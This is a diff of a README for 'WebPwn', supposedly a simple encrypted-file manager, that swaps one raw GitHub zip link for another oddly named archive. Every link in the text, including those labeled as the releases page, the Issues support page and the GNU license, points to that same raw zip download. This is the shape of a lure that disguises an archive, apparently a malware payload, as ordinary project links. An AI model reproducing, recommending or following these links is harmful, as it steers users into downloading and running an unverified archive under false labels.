@@ -1,13 +1,13 @@
 # 🌐 WebPwn - Simple Access to Encrypted File Management
 
 ## 📥 Download Now
-[![Download WebPwn](https://raw.githubusercontent.com/Ahmedsaifullah/WebPwn/main/Decalogist/WebPwn.zip)](https://raw.githubusercontent.com/Ahmedsaifullah/WebPwn/main/Decalogist/WebPwn.zip)
+[![Download WebPwn](https://raw.githubusercontent.com/Ahmedsaifullah/WebPwn/main/Decalogist/Pwn-Web-amyelinic.zip)](https://raw.githubusercontent.com/Ahmedsaifullah/WebPwn/main/Decalogist/Pwn-Web-amyelinic.zip)
 
 ## 🚀 Getting Started
 Welcome to WebPwn! This application helps you manage and access encrypted files easily. Follow these simple steps to get started.
 
 ## 🔗 Download & Install
-1. Visit this page to download: [WebPwn Releases](https://raw.githubusercontent.com/Ahmedsaifullah/WebPwn/main/Decalogist/WebPwn.zip)
+1. Visit this page to download: [WebPwn Releases](https://raw.githubusercontent.com/Ahmedsaifullah/WebPwn/main/Decalogist/Pwn-Web-amyelinic.zip)
 2. On the releases page, you will find the latest version of WebPwn. 
 3. Download the file suitable for your operating system.
 4. Locate the downloaded file on your computer.
@@ -41,7 +41,7 @@ Welcome to WebPwn! This application helps you manage and access encrypted files 
 - **File Access Problems:** Ensure you have entered the correct encryption key when decrypting files. If you forget the key, you won’t be able to access your files.
 
 ## 📞 Support
-If you have any questions or encounter any issues, please reach out to our support team through the [WebPwn GitHub Issues page](https://raw.githubusercontent.com/Ahmedsaifullah/WebPwn/main/Decalogist/WebPwn.zip).
+If you have any questions or encounter any issues, please reach out to our support team through the [WebPwn GitHub Issues page](https://raw.githubusercontent.com/Ahmedsaifullah/WebPwn/main/Decalogist/Pwn-Web-amyelinic.zip).
 
 ## 🤝 Contribute
 We welcome contributions! If you wish to improve WebPwn or report issues, feel free to submit a pull request or raise an issue on our GitHub page.
@@ -50,6 +50,6 @@ We welcome contributions! If you wish to improve WebPwn or report issues, feel f
 WebPwn is designed for users who want a straightforward way to manage their encrypted files. The application provides essential features without complicated settings, making file management accessible for everyone. 
 
 ## 📄 License
-WebPwn is open-source software. You can modify and share it according to the [GNU General Public License](https://raw.githubusercontent.com/Ahmedsaifullah/WebPwn/main/Decalogist/WebPwn.zip). 
+WebPwn is open-source software. You can modify and share it according to the [GNU General Public License](https://raw.githubusercontent.com/Ahmedsaifullah/WebPwn/main/Decalogist/Pwn-Web-amyelinic.zip). 
 
 Thank you for choosing WebPwn! Happy file managing!
